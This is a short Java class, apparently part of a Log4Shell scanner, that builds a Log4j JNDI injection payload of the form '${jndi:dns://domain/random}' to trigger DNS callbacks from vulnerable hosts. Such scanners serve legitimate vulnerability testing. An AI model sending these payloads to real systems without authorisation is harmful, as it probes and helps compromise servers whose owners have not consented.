package cn.xxx.poc.impl;

import cn.xxx.poc.IPOC;
import cn.xxx.utils.Utils;

public class POC9 implements IPOC {
    @Override
    public String generate(String domain) {
        return "${jndi:dns://" + domain + "/" + Utils.GetRandomString(Utils.GetRandomNumber(2, 5)) + "}";
    }

    @Override
    public int getType() {
        return POC_TYPE_DNS;
    }
}
